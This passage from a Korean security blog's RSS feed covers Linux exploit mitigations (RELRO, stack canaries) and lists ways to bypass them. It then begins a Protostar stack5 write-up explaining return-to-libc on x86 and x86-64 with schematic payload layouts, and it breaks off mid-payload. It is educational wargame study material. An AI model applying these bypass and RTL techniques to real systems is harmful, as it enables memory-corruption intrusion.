              &lt;li&gt;오브젝트 파일(소스)가 dynamic linking을 사용하면 해당 파일의 elf header 에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PT_DYNAMIC&lt;/code&gt; 타입의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 이라는 섹션이 생기는데, 이때 해당 섹션에는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_DYNAMIC&lt;/code&gt; 이라는 심볼이 붙는다.&lt;/li&gt;
              &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_DYNAMIC&lt;/code&gt; 섹션 안에는 함수 엔트리를 가리키는 포인터가 있다.&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;ELF Header에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RELRO&lt;/code&gt; 영역이 생기고, 해당영역의 권한은 RO이다.
        &lt;ul&gt;
          &lt;li&gt;해당 영역에 포함되는 Section은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INIT_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FINI_ARRAY&lt;/code&gt; 이다.&lt;/li&gt;
          &lt;li&gt;즉 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; 에 속하지 않는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 섹션은 덮어쓸 수 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Full RELRO-Now Binding
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.bss&lt;/code&gt; section 이외 모든 영역의 쓰기 권한이 없어진다.&lt;/li&gt;
      &lt;li&gt;ELF Header에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RELRO&lt;/code&gt; 영역이 생기고, 해당 영역의 권한은 RO이다.
        &lt;ul&gt;
          &lt;li&gt;해당 영역에 포함되는 Section은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INIT_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FINI_ARRAY&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTGOT&lt;/code&gt; 이다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Section 영역에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTRELSZ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PLTREL&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JMPREL&lt;/code&gt; 이 제거되고 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BIND_NOW&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FLAGS_1&lt;/code&gt; 섹션이 추가된다.&lt;/li&gt;
      &lt;li&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 섹션을 덮어쓸 수 없다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;017-sspstack-smashing-protector&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;Stack Smashing, 즉 스택을 violating하는 스택 버퍼 오버플로우를 막기 위해 고안된 방식이다.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;보통은 Stack Canary라고 부른다.&lt;/p&gt;

&lt;p&gt;함수가 실행될 때 스택의 RBP와 RET 사이에 랜덤으로 생성된 Canary를 삽입한다. Canary 가 변조된 것이 확인되면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;__stack_chk_fail&lt;/code&gt; 함수가 호출되면서 프로그램이 종료되기 때문에, RET 변조를 이용한 공격을 방어할 수 있다.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;1-how-to-bypass-them&quot;&gt;1. How to Bypass them&lt;/h1&gt;

&lt;h2 id=&quot;01-linux-1&quot;&gt;0.1. Linux&lt;/h2&gt;

&lt;h3 id=&quot;011-aslraddress-space-layout-randomization-1&quot;&gt;0.1.1. ASLR(Address Space Layout Randomization)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Address Leak: 가장 현실적&lt;/li&gt;
  &lt;li&gt;ASLR Bypass Brute-Force attack&lt;/li&gt;
  &lt;li&gt;NOP Sled&lt;/li&gt;
  &lt;li&gt;Heap Spraying&lt;/li&gt;
  &lt;li&gt;RTL using Symbolic Link&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;012-ascii-armor-1&quot;&gt;0.1.2. ASCII-Armor&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RTL: 쓰레기값에 심볼릭 링크를 거는 방식의 RTL(Omega Project)&lt;/li&gt;
  &lt;li&gt;Chainning RTL&lt;/li&gt;
  &lt;li&gt;PLT &amp;amp; GOT Overwrite&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;013-fortify_source-1&quot;&gt;0.1.3. FORTIFY_SOURCE&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;입력값이 저장될 위치의 크기를 알 수 없다면 아무런 검사를 수행할 수 없기 때문에 빌트인 함수가 아닌 원본의 라이브러리 함수로 변경된다.&lt;/li&gt;
  &lt;li&gt;즉, 전달되는 크기 정보를 망가뜨려 버리거나 저장될 위치의 크기를 알 수 없다는 뜻의 플래그를 리턴하도록 한다면 얼마든지 회피할 수 있다.&lt;/li&gt;
  &lt;li&gt;한 예로, 저장 위치 포인터가 함수 호출을 통해 함수 간에 전달된다면 크기 정보가 모두 사라지는 이유로 검사 수행이 불가능하기 때문에 우회 가능해진다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;014-nx-bit&quot;&gt;0.1.4. NX-bit&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;RTL: RX 권한들이 동시에 존재하는 메모리 영역이 없기 때문에, 프로그램에 스택 버퍼 오버플로우 취약점이 존재하는 경우 X 권한이 있는 메모리 페이지에 위치한 코드들을 걸치면서 이동해 코드 플로우를 바꾸는 방식으로 익스플로잇할 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;015-pieposition-independent-executable-1&quot;&gt;0.1.5. PIE(Position Independent Executable)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;코드 영역의 주소를 알아내는 것이 우선이다. 특정 코드 영역의 주소를 leak한 이후, 구한 주소를 이용해 베이스 주소를 구할 수 있다. 이렇게 구한 코드 베이스 주소에 대해 오프셋 계산을 함으로써 여타 시스템 함수들의 주소를 구할 수 있다.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;016-relrorelocation-read-only-1&quot;&gt;0.1.6. RELRO(RELocation Read-Only)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Partial RELRO
    &lt;ul&gt;
      &lt;li&gt;plt, got는 보호받지 못하기 때문에 PLT&amp;amp;GOT Overwriting이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Full RELRO
    &lt;ul&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ctors&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dtors&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.jcr&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dynamic&lt;/code&gt; , &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.got&lt;/code&gt; 등의 영역에 RO가 설정되기 때문에, 그냥 이 영역들을 쓰지 않으면 쉽게 익스플로잇이 가능하다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;017-sspstack-smashing-protector-1&quot;&gt;0.1.7. SSP(Stack Smashing Protector)&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Canary Leak: 가장 현실적! 함수의 프롤로그에서 스택에 카나리 값을 저장하므로, 이를 읽어낼 수 있다면 카나리와 똑같은 값을 오버플로우 페이로드에 집어넣어 우회할 수 있다.&lt;/li&gt;
  &lt;li&gt;TLS(Thread Local Storage) 접근: 카나리 값이 프로세스가 시작될 때 TLS에 전역변수로 저장되고, 각 함수마다 프롤로그와 에필로그에서 이 값을 참조하기 때문에 TLS 주소를 Leak 한다면 카나리의 값을 알아내거나 조작할 수 있다.&lt;/li&gt;
  &lt;li&gt;Brute Forcing Attack: 사실상 불가능하다.&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 21 Nov 2022 09:08:23 -0600</pubDate>
        <link>https://touBVa.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/system_hacking/memory-exploit-mitigation-bypass-01/</guid>
      </item>
    
      <item>
        <title>Protostar-stack5.c x86 &amp; x86-64</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-x86에서의-rtl과-x64에서의-rtl&quot; id=&quot;markdown-toc-0-x86에서의-rtl과-x64에서의-rtl&quot;&gt;0. X86에서의 RTL과 X64에서의 RTL&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#01-rtl이란&quot; id=&quot;markdown-toc-01-rtl이란&quot;&gt;0.1. RTL이란&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#02-요점&quot; id=&quot;markdown-toc-02-요점&quot;&gt;0.2. 요점&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-x86-기반에서-rtl-수행하기&quot; id=&quot;markdown-toc-1-x86-기반에서-rtl-수행하기&quot;&gt;1. X86 기반에서 RTL 수행하기&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#11-파라미터가-스택에&quot; id=&quot;markdown-toc-11-파라미터가-스택에&quot;&gt;1.1. 파라미터가 스택에?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#12-rtl을-위한-스택-조작&quot; id=&quot;markdown-toc-12-rtl을-위한-스택-조작&quot;&gt;1.2. RTL을 위한 스택 조작&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#13-실습&quot; id=&quot;markdown-toc-13-실습&quot;&gt;1.3. 실습&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#131-대상-프로그램-분석해-취약점-지정&quot; id=&quot;markdown-toc-131-대상-프로그램-분석해-취약점-지정&quot;&gt;1.3.1. 대상 프로그램 분석해 취약점 지정&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#132-bof-취약점-익스플로잇할-방법-지정&quot; id=&quot;markdown-toc-132-bof-취약점-익스플로잇할-방법-지정&quot;&gt;1.3.2. BOF 취약점 익스플로잇할 방법 지정&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#133-익스플로잇-생성&quot; id=&quot;markdown-toc-133-익스플로잇-생성&quot;&gt;1.3.3. 익스플로잇 생성&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-x86-64-기반에서-rtl-수행하기&quot; id=&quot;markdown-toc-2-x86-64-기반에서-rtl-수행하기&quot;&gt;2. X86-64 기반에서 RTL 수행하기&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-페이로드가-왜-이-모양이야&quot; id=&quot;markdown-toc-21-페이로드가-왜-이-모양이야&quot;&gt;2.1. 페이로드가 왜 이 모양이야?&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#22-익스플로잇-생성&quot; id=&quot;markdown-toc-22-익스플로잇-생성&quot;&gt;2.2. 익스플로잇 생성&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#221-offset-byte의-크기-알기&quot; id=&quot;markdown-toc-221-offset-byte의-크기-알기&quot;&gt;2.2.1. Offset Byte의 크기 알기&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#222-gadget의-주소-알기&quot; id=&quot;markdown-toc-222-gadget의-주소-알기&quot;&gt;2.2.2. Gadget의 주소 알기&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#223-binsh과-system의-주소-알기&quot; id=&quot;markdown-toc-223-binsh과-system의-주소-알기&quot;&gt;2.2.3. “/bin/sh”과 system의 주소 알기&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#224-익스플로잇-생성&quot; id=&quot;markdown-toc-224-익스플로잇-생성&quot;&gt;2.2.4. 익스플로잇 생성&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-삽질이-남긴-지식&quot; id=&quot;markdown-toc-3-삽질이-남긴-지식&quot;&gt;3. 삽질이 남긴 지식&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#31-리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot; id=&quot;markdown-toc-31-리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot;&gt;3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#311-file-link&quot; id=&quot;markdown-toc-311-file-link&quot;&gt;3.1.1. File Link&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#312-gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot; id=&quot;markdown-toc-312-gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot;&gt;3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-참고문헌&quot; id=&quot;markdown-toc-4-참고문헌&quot;&gt;4. 참고문헌&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;학교 수업에서 풀이한 문제 중 하나로, x86에서의 RTL과 x86-64에서의 RTL을 모두 실습하기에 좋은 문제인 것 같아 블로그에 기록해본다.&lt;/p&gt;

&lt;p&gt;사실 이 문제는 BOF로 쉘코드를 넣으라고 만들어준 문제이긴 하지만, 1) 마음대로 RTL을 하기에도 괜찮아 보이고 2) 32bit로 컴파일 시 메인 함수의 에필로그가 달라지는 문제가 있기에 해결해 보고 싶어 선택했다.&lt;/p&gt;

&lt;hr /&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;0-x86에서의-rtl과-x64에서의-rtl&quot;&gt;0. X86에서의 RTL과 X64에서의 RTL&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;01-rtl이란&quot;&gt;0.1. RTL이란&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;RTL 이란 Return 2 Library(or Libc)의 약자로, 프로그램 실행 시 해당 언어로 짜인 코드에는 필수적으로 포함되는 라이브러리가(gcc 컴파일러의 경우 libc) 함께 메모리에 로딩되는 점을 악용하여 프로세스 플로우를 해당 라이브러리 내의 원하는 함수로 변경시켜 시스템이 공격자가 원하는 행위를 하도록 조작하는 공격 기법을 의미한다.&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;윈도우의 경우 RTL은 DEP가 설정되어 있어 스택에서 코드 실행이 불가능할 경우 사용된다.&lt;/li&gt;
    &lt;li&gt;DEP는 윈도우의 스택 내 코드 실행 방지를 위한 보안 정책인데, Linux Stack Canary의 윈도우 버전인 Stack Cookie와는 다르다. 오히려 Linux의 NX-bit와 좀 더 겹친다고 보는 게 맞다.
      &lt;ul&gt;
        &lt;li&gt;Windows XP SP2와 Windows 2003 SP1에서부터 추가된 기능으로, 웜바이러스의 BOF 익스플로잇 과정(data 영역인 Thread stack을 공격)을 차단하는 것이 목적이었다.&lt;/li&gt;
        &lt;li&gt;가상 메모리 영역을 ‘실행 불가’ 상태로 처리하고, 여기에서 코드가 실행되고자 한다면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;STATUS_ACCESS_VIOLATION&lt;/code&gt; 예외를 발생시킴으로써 프로세스를 Kill 하는 것이 기본 원리이다.&lt;/li&gt;
        &lt;li&gt;위의 원리를 위해 가상메모리 페이지 옵션에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READ&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_READWRITE&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAGE_EXECUTE_WRITECOPY&lt;/code&gt; 플래그를 추가했다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;DEP에는 소프트웨어가 제공하는 DEP와 하드웨어가 제공하는 DEP가 있다.
      &lt;ul&gt;
        &lt;li&gt;하드웨어 DEP는 메모리를 페이지 단위에서 실행 불가능으로 처리해 CPU에게 넘기는 방식이다.&lt;/li&gt;
        &lt;li&gt;소프트웨어 DEP는 데이터 페이지 부근에서의 코드 실행을 막지는 못하지만 SEH 덮어쓰기 등의 공격은 막을 수 있다.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;02-요점&quot;&gt;0.2. 요점&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;32bit architecture의 함수 calling convention과 64bit architecture의 함수 calling convention은 레지스터 확보 문제로 인해 달라졌다.&lt;/li&gt;
  &lt;li&gt;32 bit architecture에서는 안 그래도 부족한 용량이라 연산 시 가상메모리 외의 용량 자원인 레지스터를 더 잘 써야 할 필요성이 있다. 즉, 그 귀한 레지스터를 꼴랑 함수의 파라미터를 저장하는 데 사용하지 않는다. 결과적으로 함수의 파라미터는 스택에 저장되어 전달된다.&lt;/li&gt;
  &lt;li&gt;64 bit architecture에서는 이야기가 다르다. 함수의 파라미터가 레지스터 6개에 먼저 저장되고, 그래도 파라미터가 남으면 남은 파라미터를 스택에 저장하기 때문이다.
    &lt;ul&gt;
      &lt;li&gt;64bit 구조가 되면서 메모리 주소 체계도 달라져 프로세스에 할당 가능한 가상 메모리 크기가 16EB까지 올라갔다. 그로 인해 원래 레지스터가 감당해야 했던 저장의 필요성이 사라지며 잉여 레지스터들이 생기게 되었다.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;컴퓨터구조를 배운 사람들이라면 레지스터 메모리가 가장 빠른 메모리임을 알 것이다. 메모리들의 가용 용량/속도의 관계를 나타낸 이미지를 첨부한다.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled.jpeg&quot; alt=&quot;Untitled&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;가장 빈번하게 읽어와야 하는 것이 함수의 파라미터이기 때문에 속도의 효율성을 위해 레지스터에 파라미터를 저장하는 것으로 함수의 calling convention을 정의하게 되었다. 그렇게 하더라도 저장 성능 오버헤드 대비 속도 이득이 훨씬 높기 때문이다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;이로 인해 RTL 기법을 이용한 익스플로잇 수행 시 입력해야 할 페이로드의 형태가 달라졌다. 다음 장에서 자세히 설명할 것이므로 아래에는 페이로드의 구성만 언급한다.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;32bit&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/*(ret of the libc function)*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;64bit (왜 페이로드가 이런 꼴인지 이해가 어려울 수 있지만, 아래에서 RSP의 위치 변동을 감안하며 설명하겠다)&lt;/p&gt;

        &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Gadget&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;hr /&gt;
&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-x86-기반에서-rtl-수행하기&quot;&gt;1. X86 기반에서 RTL 수행하기&lt;/h1&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;11-파라미터가-스택에&quot;&gt;1.1. 파라미터가 스택에?&lt;/h2&gt;

&lt;p&gt;C 언어의 경우 함수의 Calling Convention을 정의해 둔 것은 __cdecl이다. 관련해 좀 더 자세한 설명과 리눅스에서 cdecl 사용을 확인하는 과정은 &lt;a href=&quot;https://toubva.github.io/blog/system-hacking-step5/#/&quot;&gt;여기&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;만일 sum(1, 2)를 콜했다면 sum 함수의 line 1에 들어섰을 때의 스택 구조는 아래와 같을 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Stack frame of Callee over EBP and RET&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;EBP(SFP of the caller)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;RET&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Stack frame of the Caller&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;파라미터는 마지막 파라미터부터 스택에 push된다는 점을 다시 한 번 주지하고자 한다. 왜냐하면 ESP는 pop될 때 낮은 주소에서 높은 주소로 이동하기 때문이다. 즉, 파라미터를 스택에 push한 것과 거꾸로의 순서를 따라 파라미터를 읽어오기 때문에 마지막 파라미터부터 push하는 것이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;12-rtl을-위한-스택-조작&quot;&gt;1.2. RTL을 위한 스택 조작&lt;/h2&gt;

&lt;p&gt;위에서 말한 Cdecl 규약에 따른다면, RTL을 하기 위해서는 어떤 식으로 스택을 조작해야 할까?&lt;/p&gt;

&lt;p&gt;해결책은 정말 간단하고 논리적이다. RET address를 Libc에 올라가 있는 특정 함수의 주소로 조작하고, 해당 함수가 제공하는 기능을 이용하여 쉘 프로세스를 실행할 수 있도록 해당 함수의 파라미터 형식에 맞는 파라미터를 Cdecl 규약에 부합하도록 적합한 위치에 넣어두는 것이다.&lt;/p&gt;

&lt;p&gt;위의 설명만 읽으면 직전에 말한 간단하다는 말이 무색할 만큼 복잡하기 짝이 없어 보인다. 그러니 아래 그림을 보자. BOF 취약점으로 스택을 조작할 수 있다는 전제 하에서 그린 그림이다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Dump bytes(Overflowed)&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Corrupted EBP&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Libc function address(Corrupted RET) (1)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Will be RET of a called libc function (4 bytes) (2)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1st Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2nd Param of the function&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;…&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;따라서, BOF 취약점이 존재한다고 가정할 때 페이로드의 구조는 아래와 같을 수밖에 없다.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Library&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span 